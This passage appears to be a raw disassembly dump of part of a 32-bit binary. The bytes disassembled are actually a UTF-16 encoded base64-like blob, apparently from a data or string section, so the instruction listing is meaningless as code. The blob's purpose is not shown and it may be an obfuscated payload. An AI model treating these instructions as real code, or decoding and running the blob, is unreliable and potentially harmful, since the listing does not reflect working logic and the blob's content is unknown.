  40b37c:	4c                   	dec    %esp
  40b37d:	00 66 00             	add    %ah,0x0(%esi)
  40b380:	7a 00                	jp     0x40b382
  40b382:	47                   	inc    %edi
  40b383:	00 2b                	add    %ch,(%ebx)
  40b385:	00 37                	add    %dh,(%edi)
  40b387:	00 6a 00             	add    %ch,0x0(%edx)
  40b38a:	61                   	popa
  40b38b:	00 69 00             	add    %ch,0x0(%ecx)
  40b38e:	70 00                	jo     0x40b390
  40b390:	37                   	aaa
  40b391:	00 4e 00             	add    %cl,0x0(%esi)
  40b394:	67 00 45 00          	add    %al,0x0(%di)
  40b398:	7a 00                	jp     0x40b39a
  40b39a:	6f                   	outsl  %ds:(%esi),(%dx)
  40b39b:	00 57 00             	add    %dl,0x0(%edi)
  40b39e:	46                   	inc    %esi
  40b39f:	00 67 00             	add    %ah,0x0(%edi)
  40b3a2:	35 00 45 00 4b       	xor    $0x4b004500,%eax
  40b3a7:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  40b3ab:	00 76 00             	add    %dh,0x0(%esi)
  40b3ae:	74 00                	je     0x40b3b0
  40b3b0:	38 00                	cmp    %al,(%eax)
  40b3b2:	78 00                	js     0x40b3b4
  40b3b4:	4e                   	dec    %esi
  40b3b5:	00 49 00             	add    %cl,0x0(%ecx)
  40b3b8:	31 00                	xor    %eax,(%eax)
  40b3ba:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40b3be:	77 00                	ja     0x40b3c0
  40b3c0:	72 00                	jb     0x40b3c2
  40b3c2:	71 00                	jno    0x40b3c4
  40b3c4:	2f                   	das
  40b3c5:	00 38                	add    %bh,(%eax)
  40b3c7:	00 49 00             	add    %cl,0x0(%ecx)
  40b3ca:	2b 00                	sub    (%eax),%eax
  40b3cc:	4a                   	dec    %edx
  40b3cd:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40b3d1:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3d4:	34 00                	xor    $0x0,%al
  40b3d6:	50                   	push   %eax
  40b3d7:	00 33                	add    %dh,(%ebx)
  40b3d9:	00 77 00             	add    %dh,0x0(%edi)
  40b3dc:	67 00 4f 00          	add    %cl,0x0(%bx)
  40b3e0:	54                   	push   %esp
  40b3e1:	00 39                	add    %bh,(%ecx)
  40b3e3:	00 62 00             	add    %ah,0x0(%edx)
  40b3e6:	74 00                	je     0x40b3e8
  40b3e8:	39 00                	cmp    %eax,(%eax)
  40b3ea:	58                   	pop    %eax
  40b3eb:	00 43 00             	add    %al,0x0(%ebx)
  40b3ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3ef:	00 35 00 62 00 32    	add    %dh,0x32006200
  40b3f5:	00 35 00 6b 00 72    	add    %dh,0x72006b00
  40b3fb:	00 58 00             	add    %bl,0x0(%eax)
  40b3fe:	55                   	push   %ebp
  40b3ff:	00 4f 00             	add    %cl,0x0(%edi)
  40b402:	42                   	inc    %edx
  40b403:	00 31                	add    %dh,(%ecx)
  40b405:	00 61 00             	add    %ah,0x0(%ecx)
  40b408:	53                   	push   %ebx
  40b409:	00 6d 00             	add    %ch,0x0(%ebp)
  40b40c:	65 00 33             	add    %dh,%gs:(%ebx)
  40b40f:	00 36                	add    %dh,(%esi)
  40b411:	00 77 00             	add    %dh,0x0(%edi)
  40b414:	42                   	inc    %edx
  40b415:	00 36                	add    %dh,(%esi)
  40b417:	00 6b 00             	add    %ch,0x0(%ebx)
  40b41a:	63 00                	arpl   %eax,(%eax)
  40b41c:	50                   	push   %eax
  40b41d:	00 6e 00             	add    %ch,0x0(%esi)
  40b420:	34 00                	xor    $0x0,%al
  40b422:	54                   	push   %esp
  40b423:	00 78 00             	add    %bh,0x0(%eax)
  40b426:	5a                   	pop    %edx
  40b427:	00 4e 00             	add    %cl,0x0(%esi)
  40b42a:	42                   	inc    %edx
  40b42b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b42e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b42f:	00 51 00             	add    %dl,0x0(%ecx)
  40b432:	2b 00                	sub    (%eax),%eax
  40b434:	39 00                	cmp    %eax,(%eax)
  40b436:	37                   	aaa
  40b437:	00 4d 00             	add    %cl,0x0(%ebp)
  40b43a:	2b 00                	sub    (%eax),%eax
  40b43c:	34 00                	xor    $0x0,%al
  40b43e:	41                   	inc    %ecx
  40b43f:	00 43 00             	add    %al,0x0(%ebx)
  40b442:	33 00                	xor    (%eax),%eax
  40b444:	55                   	push   %ebp
  40b445:	00 7a 00             	add    %bh,0x0(%edx)
  40b448:	48                   	dec    %eax
  40b449:	00 33                	add    %dh,(%ebx)
  40b44b:	00 2f                	add    %ch,(%edi)
  40b44d:	00 6e 00             	add    %ch,0x0(%esi)
  40b450:	39 00                	cmp    %eax,(%eax)
  40b452:	5a                   	pop    %edx
  40b453:	00 36                	add    %dh,(%esi)
  40b455:	00 77 00             	add    %dh,0x0(%edi)
  40b458:	52                   	push   %edx
  40b459:	00 4d 00             	add    %cl,0x0(%ebp)
  40b45c:	53                   	push   %ebx
  40b45d:	00 4b 00             	add    %cl,0x0(%ebx)
  40b460:	7a 00                	jp     0x40b462
  40b462:	50                   	push   %eax
  40b463:	00 61 00             	add    %ah,0x0(%ecx)
  40b466:	50                   	push   %eax
  40b467:	00 62 00             	add    %ah,0x0(%edx)
  40b46a:	37                   	aaa
  40b46b:	00 72 00             	add    %dh,0x0(%edx)
  40b46e:	65 00 30             	add    %dh,%gs:(%eax)
  40b471:	00 75 00             	add    %dh,0x0(%ebp)
  40b474:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40b478:	39 00                	cmp    %eax,(%eax)
  40b47a:	70 00                	jo     0x40b47c
  40b47c:	52                   	push   %edx
  40b47d:	00 4f 00             	add    %cl,0x0(%edi)
  40b480:	4a                   	dec    %edx
  40b481:	00 70 00             	add    %dh,0x0(%eax)
  40b484:	57                   	push   %edi
  40b485:	00 69 00             	add    %ch,0x0(%ecx)
  40b488:	59                   	pop    %ecx
  40b489:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40b48d:	00 6a 00             	add    %ch,0x0(%edx)
  40b490:	68 00 62 00 54       	push   $0x54006200
  40b495:	00 53 00             	add    %dl,0x0(%ebx)
  40b498:	65 00 37             	add    %dh,%gs:(%edi)
  40b49b:	00 45 00             	add    %al,0x0(%ebp)
  40b49e:	30 00                	xor    %al,(%eax)
  40b4a0:	67 00 77 00          	add    %dh,0x0(%bx)
  40b4a4:	4b                   	dec    %ebx
  40b4a5:	00 6a 00             	add    %ch,0x0(%edx)
  40b4a8:	30 00                	xor    %al,(%eax)
  40b4aa:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4ab:	00 2f                	add    %ch,(%edi)
  40b4ad:	00 52 00             	add    %dl,0x0(%edx)
  40b4b0:	38 00                	cmp    %al,(%eax)
  40b4b2:	70 00                	jo     0x40b4b4
  40b4b4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4b5:	00 63 00             	add    %ah,0x0(%ebx)
  40b4b8:	39 00                	cmp    %eax,(%eax)
  40b4ba:	76 00                	jbe    0x40b4bc
  40b4bc:	46                   	inc    %esi
  40b4bd:	00 79 00             	add    %bh,0x0(%ecx)
  40b4c0:	75 00                	jne    0x40b4c2
  40b4c2:	56                   	push   %esi
  40b4c3:	00 4f 00             	add    %cl,0x0(%edi)
  40b4c6:	44                   	inc    %esp
  40b4c7:	00 59 00             	add    %bl,0x0(%ecx)
  40b4ca:	49                   	dec    %ecx
  40b4cb:	00 4e 00             	add    %cl,0x0(%esi)
  40b4ce:	69 00 51 00 4c 00    	imul   $0x4c0051,(%eax),%eax
  40b4d4:	6b 00 69             	imul   $0x69,(%eax),%eax
  40b4d7:	00 6a 00             	add    %ch,0x0(%edx)
  40b4da:	4d                   	dec    %ebp
  40b4db:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40b4df:	00 50 00             	add    %dl,0x0(%eax)
  40b4e2:	51                   	push   %ecx
  40b4e3:	00 77 00             	add    %dh,0x0(%edi)
  40b4e6:	5a                   	pop    %edx
  40b4e7:	00 56 00             	add    %dl,0x0(%esi)
  40b4ea:	31 00                	xor    %eax,(%eax)
  40b4ec:	62 00                	bound  %eax,(%eax)
  40b4ee:	45                   	inc    %ebp
  40b4ef:	00 6f 00             	add    %ch,0x0(%edi)
  40b4f2:	4c                   	dec    %esp
  40b4f3:	00 51 00             	add    %dl,0x0(%ecx)
  40b4f6:	76 00                	jbe    0x40b4f8
  40b4f8:	4f                   	dec    %edi
  40b4f9:	00 78 00             	add    %bh,0x0(%eax)
  40b4fc:	52                   	push   %edx
  40b4fd:	00 49 00             	add    %cl,0x0(%ecx)
  40b500:	37                   	aaa
  40b501:	00 6f 00             	add    %ch,0x0(%edi)
  40b504:	73 00                	jae    0x40b506
  40b506:	30 00                	xor    %al,(%eax)
  40b508:	44                   	inc    %esp
  40b509:	00 52 00             	add    %dl,0x0(%edx)
  40b50c:	69 00 35 00 44 00    	imul   $0x440035,(%eax),%eax
  40b512:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b515:	00 50 00             	add    %dl,0x0(%eax)
  40b518:	4b                   	dec    %ebx
  40b519:	00 33                	add    %dh,(%ebx)
  40b51b:	00 78 00             	add    %bh,0x0(%eax)
  40b51e:	6c                   	insb   (%dx),%es:(%edi)
  40b51f:	00 33                	add    %dh,(%ebx)
  40b521:	00 59 00             	add    %bl,0x0(%ecx)
  40b524:	4f                   	dec    %edi
  40b525:	00 47 00             	add    %al,0x0(%edi)
  40b528:	67 00 2f             	add    %ch,(%bx)
  40b52b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b52e:	56                   	push   %esi
  40b52f:	00 79 00             	add    %bh,0x0(%ecx)
  40b532:	4b                   	dec    %ebx
  40b533:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b537:	00 4f 00             	add    %cl,0x0(%edi)
  40b53a:	78 00                	js     0x40b53c
  40b53c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b53d:	00 72 00             	add    %dh,0x0(%edx)
  40b540:	6d                   	insl   (%dx),%es:(%edi)
  40b541:	00 57 00             	add    %dl,0x0(%edi)
  40b544:	68 00 61 00 5a       	push   $0x5a006100
  40b549:	00 4e 00             	add    %cl,0x0(%esi)
  40b54c:	57                   	push   %edi
  40b54d:	00 78 00             	add    %bh,0x0(%eax)
  40b550:	59                   	pop    %ecx
  40b551:	00 36                	add    %dh,(%esi)
  40b553:	00 47 00             	add    %al,0x0(%edi)
  40b556:	47                   	inc    %edi
  40b557:	00 7a 00             	add    %bh,0x0(%edx)
  40b55a:	76 00                	jbe    0x40b55c
  40b55c:	63 00                	arpl   %eax,(%eax)
  40b55e:	78 00                	js     0x40b560
  40b560:	77 00                	ja     0x40b562
  40b562:	70 00                	jo     0x40b564
  40b564:	4e                   	dec    %esi
  40b565:	00 32                	add    %dh,(%edx)
  40b567:	00 55 00             	add    %dl,0x0(%ebp)
  40b56a:	52                   	push   %edx
  40b56b:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  40b56f:	00 7a 00             	add    %bh,0x0(%edx)
  40b572:	75 00                	jne    0x40b574
  40b574:	69 00 4c 00 6a 00    	imul   $0x6a004c,(%eax),%eax
  40b57a:	4b                   	dec    %ebx
  40b57b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b57e:	4f                   	dec    %edi
  40b57f:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40b583:	00 36                	add    %dh,(%esi)
  40b585:	00 4f 00             	add    %cl,0x0(%edi)
  40b588:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  40b58c:	4d                   	dec    %ebp
  40b58d:	00 39                	add    %bh,(%ecx)
  40b58f:	00 78 00             	add    %bh,0x0(%eax)
  40b592:	78 00                	js     0x40b594
  40b594:	37                   	aaa
  40b595:	00 51 00             	add    %dl,0x0(%ecx)
  40b598:	36 00 74 00 38       	add    %dh,%ss:0x38(%eax,%eax,1)
  40b59d:	00 55 00             	add    %dl,0x0(%ebp)
  40b5a0:	30 00                	xor    %al,(%eax)
  40b5a2:	62 00                	bound  %eax,(%eax)
  40b5a4:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40b5a8:	70 00                	jo     0x40b5aa
  40b5aa:	4e                   	dec    %esi
  40b5ab:	00 38                	add    %bh,(%eax)
  40b5ad:	00 36                	add    %dh,(%esi)
  40b5af:	00 75 00             	add    %dh,0x0(%ebp)
  40b5b2:	30 00                	xor    %al,(%eax)
  40b5b4:	2b 00                	sub    (%eax),%eax
  40b5b6:	49                   	dec    %ecx
  40b5b7:	00 76 00             	add    %dh,0x0(%esi)
  40b5ba:	6b 00 77             	imul   $0x77,(%eax),%eax
  40b5bd:	00 56 00             	add    %dl,0x0(%esi)
  40b5c0:	56                   	push   %esi
  40b5c1:	00 59 00             	add    %bl,0x0(%ecx)
  40b5c4:	72 00                	jb     0x40b5c6
  40b5c6:	39 00                	cmp    %eax,(%eax)
  40b5c8:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40b5cc:	31 00                	xor    %eax,(%eax)
  40b5ce:	54                   	push   %esp
  40b5cf:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40b5d3:	00 37                	add    %dh,(%edi)
  40b5d5:	00 75 00             	add    %dh,0x0(%ebp)
  40b5d8:	7a 00                	jp     0x40b5da
  40b5da:	61                   	popa
  40b5db:	00 45 00             	add    %al,0x0(%ebp)
  40b5de:	6a 00                	push   $0x0
  40b5e0:	4c                   	dec    %esp
  40b5e1:	00 39                	add    %bh,(%ecx)
  40b5e3:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40b5e7:	00 35 00 64 00 75    	add    %dh,0x75006400
  40b5ed:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40b5f1:	00 43 00             	add    %al,0x0(%ebx)
  40b5f4:	37                   	aaa
  40b5f5:	00 31                	add    %dh,(%ecx)
  40b5f7:	00 73 00             	add    %dh,0x0(%ebx)
  40b5fa:	4a                   	dec    %edx
  40b5fb:	00 36                	add    %dh,(%esi)
  40b5fd:	00 4e 00             	add    %cl,0x0(%esi)
  40b600:	31 00                	xor    %eax,(%eax)
  40b602:	4a                   	dec    %edx
  40b603:	00 4e 00             	add    %cl,0x0(%esi)
  40b606:	76 00                	jbe    0x40b608
  40b608:	6e                   	outsb  %ds:(%esi),(%dx)
  40b609:	00 51 00             	add    %dl,0x0(%ecx)
  40b60c:	44                   	inc    %esp
  40b60d:	00 57 00             	add    %dl,0x0(%edi)
  40b610:	74 00                	je     0x40b612
  40b612:	57                   	push   %edi
  40b613:	00 6d 00             	add    %ch,0x0(%ebp)
  40b616:	32 00                	xor    (%eax),%al
  40b618:	4a                   	dec    %edx
  40b619:	00 42 00             	add    %al,0x0(%edx)
  40b61c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b61d:	00 51 00             	add    %dl,0x0(%ecx)
  40b620:	32 00                	xor    (%eax),%al
  40b622:	61                   	popa
  40b623:	00 39                	add    %bh,(%ecx)
  40b625:	00 50 00             	add    %dl,0x0(%eax)
  40b628:	4c                   	dec    %esp
  40b629:	00 37                	add    %dh,(%edi)
  40b62b:	00 4f 00             	add    %cl,0x0(%edi)
  40b62e:	58                   	pop    %eax
  40b62f:	00 79 00             	add    %bh,0x0(%ecx)
  40b632:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  40b636:	33 00                	xor    (%eax),%eax
  40b638:	38 00                	cmp    %al,(%eax)
  40b63a:	4b                   	dec    %ebx
  40b63b:	00 2f                	add    %ch,(%edi)
  40b63d:	00 6e 00             	add    %ch,0x0(%esi)
  40b640:	70 00                	jo     0x40b642
  40b642:	66 00 74 00 54       	data16 add %dh,0x54(%eax,%eax,1)
  40b647:	00 70 00             	add    %dh,0x0(%eax)
  40b64a:	71 00                	jno    0x40b64c
  40b64c:	78 00                	js     0x40b64e
  40b64e:	35 00 4a 00 4b       	xor    $0x4b004a00,%eax
  40b653:	00 45 00             	add    %al,0x0(%ebp)
  40b656:	43                   	inc    %ebx
  40b657:	00 47 00             	add    %al,0x0(%edi)
  40b65a:	77 00                	ja     0x40b65c
  40b65c:	38 00                	cmp    %al,(%eax)
  40b65e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b65f:	00 66 00             	add    %ah,0x0(%esi)
  40b662:	45                   	inc    %ebp
  40b663:	00 3d 00 00 87 b1    	add    %bh,0xb1870000
  40b669:	71 00                	jno    0x40b66b
  40b66b:	75 00                	jne    0x40b66d
  40b66d:	59                   	pop    %ecx
  40b66e:	00 51 00             	add    %dl,0x0(%ecx)
  40b671:	49                   	dec    %ecx
  40b672:	00 47 00             	add    %al,0x0(%edi)
  40b675:	77 00                	ja     0x40b677
  40b677:	54                   	push   %esp
  40b678:	00 72 00             	add    %dh,0x0(%edx)
  40b67b:	4e                   	dec    %esi
  40b67c:	00 55 00             	add    %dl,0x0(%ebp)
  40b67f:	69 00 36 00 71 00    	imul   $0x710036,(%eax),%eax
  40b685:	79 00                	jns    0x40b687
  40b687:	6a 00                	push   $0x0
  40b689:	32 00                	xor    (%eax),%al
  40b68b:	6a 00                	push   $0x0
  40b68d:	58                   	pop    %eax
  40b68e:	00 69 00             	add    %ch,0x0(%ecx)
  40b691:	37                   	aaa
  40b692:	00 76 00             	add    %dh,0x0(%esi)
  40b695:	69 00 6d 00 74 00    	imul   $0x74006d,(%eax),%eax
  40b69b:	4f                   	dec    %edi
  40b69c:	00 42 00             	add    %al,0x0(%edx)
  40b69f:	34 00                	xor    $0x0,%al
  40b6a1:	56                   	push   %esi
  40b6a2:	00 30                	add    %dh,(%eax)
  40b6a4:	00 50 00             	add    %dl,0x0(%eax)
  40b6a7:	4a                   	dec    %edx
  40b6a8:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6ab:	59                   	pop    %ecx
  40b6ac:	00 4f 00             	add    %cl,0x0(%edi)
  40b6af:	4c                   	dec    %esp
  40b6b0:	00 59 00             	add    %bl,0x0(%ecx)
  40b6b3:	43                   	inc    %ebx
  40b6b4:	00 58 00             	add    %bl,0x0(%eax)
  40b6b7:	51                   	push   %ecx
  40b6b8:	00 73 00             	add    %dh,0x0(%ebx)
  40b6bb:	53                   	push   %ebx
  40b6bc:	00 7a 00             	add    %bh,0x0(%edx)
  40b6bf:	4f                   	dec    %edi
  40b6c0:	00 78 00             	add    %bh,0x0(%eax)
  40b6c3:	79 00                	jns    0x40b6c5
  40b6c5:	42                   	inc    %edx
  40b6c6:	00 4f 00             	add    %cl,0x0(%edi)
  40b6c9:	30 00                	xor    %al,(%eax)
  40b6cb:	64 00 76 00          	add    %dh,%fs:0x0(%esi)
  40b6cf:	53                   	push   %ebx
  40b6d0:	00 75 00             	add    %dh,0x0(%ebp)
  40b6d3:	42                   	inc    %edx
  40b6d4:	00 75 00             	add    %dh,0x0(%ebp)
  40b6d7:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40b6db:	42                   	inc    %edx
  40b6dc:	00 31                	add    %dh,(%ecx)
  40b6de:	00 39                	add    %bh,(%ecx)
  40b6e0:	00 7a 00             	add    %bh,0x0(%edx)
  40b6e3:	77 00                	ja     0x40b6e5
  40b6e5:	6c                   	insb   (%dx),%es:(%edi)
  40b6e6:	00 68 00             	add    %ch,0x0(%eax)
  40b6e9:	2b 00                	sub    (%eax),%eax
  40b6eb:	76 00                	jbe    0x40b6ed
  40b6ed:	6c                   	insb   (%dx),%es:(%edi)
  40b6ee:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40b6f2:	00 45 00             	add    %al,0x0(%ebp)
  40b6f5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6f6:	00 56 00             	add    %dl,0x0(%esi)
  40b6f9:	46                   	inc    %esi
  40b6fa:	00 37                	add    %dh,(%edi)
  40b6fc:	00 61 00             	add    %ah,0x0(%ecx)
  40b6ff:	67 00 37             	add    %dh,(%bx)
  40b702:	00 7a 00             	add    %bh,0x0(%edx)
  40b705:	4d                   	dec    %ebp
  40b706:	00 66 00             	add    %ah,0x0(%esi)
  40b709:	73 00                	jae    0x40b70b
  40b70b:	71 00                	jno    0x40b70d
  40b70d:	38 00                	cmp    %al,(%eax)
  40b70f:	31 00                	xor    %eax,(%eax)
  40b711:	41                   	inc    %ecx
  40b712:	00 66 00             	add    %ah,0x0(%esi)
  40b715:	56                   	push   %esi
  40b716:	00 42 00             	add    %al,0x0(%edx)
  40b719:	53                   	push   %ebx
  40b71a:	00 37                	add    %dh,(%edi)
  40b71c:	00 42 00             	add    %al,0x0(%edx)
  40b71f:	76 00                	jbe    0x40b721
  40b721:	30 00                	xor    %al,(%eax)
  40b723:	4a                   	dec    %edx
  40b724:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40b728:	00 61 00             	add    %ah,0x0(%ecx)
  40b72b:	37                   	aaa
  40b72c:	00 50 00             	add    %dl,0x0(%eax)
  40b72f:	4f                   	dec    %edi
  40b730:	00 52 00             	add    %dl,0x0(%edx)
  40b733:	5a                   	pop    %edx
  40b734:	00 62 00             	add    %ah,0x0(%edx)
  40b737:	69 00 51 00 37 00    	imul   $0x370051,(%eax),%eax
  40b73d:	78 00                	js     0x40b73f
  40b73f:	72 00                	jb     0x40b741
  40b741:	30 00                	xor    %al,(%eax)
  40b743:	41                   	inc    %ecx
  40b744:	00 47 00             	add    %al,0x0(%edi)
  40b747:	65 00 6c 00 4d       	add    %ch,%gs:0x4d(%eax,%eax,1)
  40b74c:	00 39                	add    %bh,(%ecx)
  40b74e:	00 4f 00             	add    %cl,0x0(%edi)
  40b751:	39 00                	cmp    %eax,(%eax)
  40b753:	6a 00                	push   $0x0
  40b755:	6a 00                	push   $0x0
  40b757:	4a                   	dec    %edx
  40b758:	00 6a 00             	add    %ch,0x0(%edx)
  40b75b:	46                   	inc    %esi
  40b75c:	00 4d 00             	add    %cl,0x0(%ebp)
  40b75f:	31 00                	xor    %eax,(%eax)
  40b761:	55                   	push   %ebp
  40b762:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  40b766:	00 67 00             	add    %ah,0x0(%edi)
  40b769:	4a                   	dec    %edx
  40b76a:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  40b76e:	00 32                	add    %dh,(%edx)
  40b770:	00 48 00             	add    %cl,0x0(%eax)
  40b773:	37                   	aaa
  40b774:	00 58 00             	add    %bl,0x0(%eax)
  40b777:	76 00                	jbe    0x40b779
  40b779:	50                   	push   %eax
  40b77a:	00 32                	add    %dh,(%edx)
  40b77c:	00 32                	add    %dh,(%edx)
  40b77e:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40b782:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40b786:	00 4a 00             	add    %cl,0x0(%edx)
  40b789:	58                   	pop    %eax
  40b78a:	00 45 00             	add    %al,0x0(%ebp)
  40b78d:	69 00 77 00 4b 00    	imul   $0x4b0077,(%eax),%eax
  40b793:	57                   	push   %edi
  40b794:	00 63 00             	add    %ah,0x0(%ebx)
  40b797:	75 00                	jne    0x40b799
  40b799:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40b79d:	39 00                	cmp    %eax,(%eax)
  40b79f:	4f                   	dec    %edi
  40b7a0:	00 38                	add    %bh,(%eax)
  40b7a2:	00 52 00             	add    %dl,0x0(%edx)
  40b7a5:	35 00 4d 00 6e       	xor    $0x6e004d00,%eax
  40b7aa:	00 58 00             	add    %bl,0x0(%eax)
  40b7ad:	31 00                	xor    %eax,(%eax)
  40b7af:	62 00                	bound  %eax,(%eax)
  40b7b1:	71 00                	jno    0x40b7b3
  40b7b3:	6d                   	insl   (%dx),%es:(%edi)
  40b7b4:	00 2f                	add    %ch,(%edi)
  40b7b6:	00 65 00             	add    %ah,0x0(%ebp)
  40b7b9:	6c                   	insb   (%dx),%es:(%edi)
  40b7ba:	00 6b 00             	add    %ch,0x0(%ebx)
  40b7bd:	63 00                	arpl   %eax,(%eax)
  40b7bf:	6b 00 74             	imul   $0x74,(%eax),%eax
  40b7c2:	00 57 00             	add    %dl,0x0(%edi)
  40b7c5:	62 00                	bound  %eax,(%eax)
  40b7c7:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7c8:	00 41 00             	add    %al,0x0(%ecx)
  40b7cb:	2f                   	das
  40b7cc:	00 49 00             	add    %cl,0x0(%ecx)
  40b7cf:	51                   	push   %ecx
  40b7d0:	00 53 00             	add    %dl,0x0(%ebx)
  40b7d3:	65 00 74 00 6e       	add    %dh,%gs:0x6e(%eax,%eax,1)
  40b7d8:	00 6a 00             	add    %ch,0x0(%edx)
  40b7db:	54                   	push   %esp
  40b7dc:	00 7a 00             	add    %bh,0x0(%edx)
  40b7df:	30 00                	xor    %al,(%eax)
  40b7e1:	4c                   	dec    %esp
  40b7e2:	00 35 00 71 00 59    	add    %dh,0x59007100
  40b7e8:	00 58 00             	add    %bl,0x0(%eax)
  40b7eb:	53                   	push   %ebx
  40b7ec:	00 53 00             	add    %dl,0x0(%ebx)
  40b7ef:	42                   	inc    %edx
  40b7f0:	00 67 00             	add    %ah,0x0(%edi)
  40b7f3:	7a 00                	jp     0x40b7f5
  40b7f5:	32 00                	xor    (%eax),%al
  40b7f7:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b7fb:	35 00 47 00 6c       	xor    $0x6c004700,%eax
  40b800:	00 71 00             	add    %dh,0x0(%ecx)
  40b803:	32 00                	xor    (%eax),%al
  40b805:	30 00                	xor    %al,(%eax)
  40b807:	37                   	aaa
  40b808:	00 45 00             	add    %al,0x0(%ebp)
  40b80b:	4d                   	dec    %ebp
  40b80c:	00 43 00             	add    %al,0x0(%ebx)
  40b80f:	77 00                	ja     0x40b811
  40b811:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40b815:	42                   	inc    %edx
  40b816:	00 38                	add    %bh,(%eax)
  40b818:	00 6d 00             	add    %ch,0x0(%ebp)
  40b81b:	41                   	inc    %ecx
  40b81c:	00 6a 00             	add    %ch,0x0(%edx)
  40b81f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b820:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40b824:	00 44 00 56          	add    %al,0x56(%eax,%eax,1)
  40b828:	00 73 00             	add    %dh,0x0(%ebx)
  40b82b:	4d                   	dec    %ebp
  40b82c:	00 69 00             	add    %ch,0x0(%ecx)
  40b82f:	2f                   	das
  40b830:	00 65 00             	add    %ah,0x0(%ebp)
  40b833:	4a                   	dec    %edx
  40b834:	00 56 00             	add    %dl,0x0(%esi)
  40b837:	72 00                	jb     0x40b839
  40b839:	33 00                	xor    (%eax),%eax
  40b83b:	33 00                	xor    (%eax),%eax
  40b83d:	69 00 4c 00 50 00    	imul   $0x50004c,(%eax),%eax
  40b843:	69 00 4d 00 47 00    	imul   $0x47004d,(%eax),%eax
  40b849:	4f                   	dec    %edi
  40b84a:	00 35 00 63 00 2f    	add    %dh,0x2f006300
  40b850:	00 43 00             	add    %al,0x0(%ebx)
  40b853:	52                   	push   %edx
  40b854:	00 38                	add    %bh,(%eax)
  40b856:	00 63 00             	add    %ah,0x0(%ebx)
  40b859:	6a 00                	push   $0x0
  40b85b:	57                   	push   %edi
  40b85c:	00 59 00             	add    %bl,0x0(%ecx)
  40b85f:	6a 00                	push   $0x0
  40b861:	56                   	push   %esi
  40b862:	00 79 00             	add    %bh,0x0(%ecx)
  40b865:	41                   	inc    %ecx
  40b866:	00 45 00             	add    %al,0x0(%ebp)
  40b869:	75 00                	jne    0x40b86b
  40b86b:	4e                   	dec    %esi
  40b86c:	00 38                	add    %bh,(%eax)
  40b86e:	00 53 00             	add    %dl,0x0(%ebx)
  40b871:	62 00                	bound  %eax,(%eax)
  40b873:	6b 00 49             	imul   $0x49,(%eax),%eax
  40b876:	00 47 00             	add    %al,0x0(%edi)
  40b879:	53                   	push   %ebx
  40b87a:	00 41 00             	add    %al,0x0(%ecx)
  40b87d:	69 00 5a 00 72 00    	imul   $0x72005a,(%eax),%eax
  40b883:	57                   	push   %edi
  40b884:	00 78 00             	add    %bh,0x0(%eax)
  40b887:	65 00 37             	add    %dh,%gs:(%edi)
  40b88a:	00 72 00             	add    %dh,0x0(%edx)
  40b88d:	71 00                	jno    0x40b88f
  40b88f:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40b893:	2f                   	das
  40b894:	00 4b 00             	add    %cl,0x0(%ebx)
  40b897:	32 00                	xor    (%eax),%al
  40b899:	4f                   	dec    %edi
  40b89a:	00 51 00             	add    %dl,0x0(%ecx)
  40b89d:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40b8a1:	2f                   	das
  40b8a2:	00 45 00             	add    %al,0x0(%ebp)
  40b8a5:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40b8a8:	00 43 00             	add    %al,0x0(%ebx)
  40b8ab:	39 00                	cmp    %eax,(%eax)
  40b8ad:	50                   	push   %eax
  40b8ae:	00 31                	add    %dh,(%ecx)
  40b8b0:	00 49 00             	add    %cl,0x0(%ecx)
  40b8b3:	4a                   	dec    %edx
  40b8b4:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b8b7:	62 00                	bound  %eax,(%eax)
  40b8b9:	55                   	push   %ebp
  40b8ba:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40b8be:	00 47 00             	add    %al,0x0(%edi)
  40b8c1:	59                   	pop    %ecx
  40b8c2:	00 46 00             	add    %al,0x0(%esi)
  40b8c5:	7a 00                	jp     0x40b8c7
  40b8c7:	32 00                	xor    (%eax),%al
  40b8c9:	4a                   	dec    %edx
  40b8ca:	00 33                	add    %dh,(%ebx)
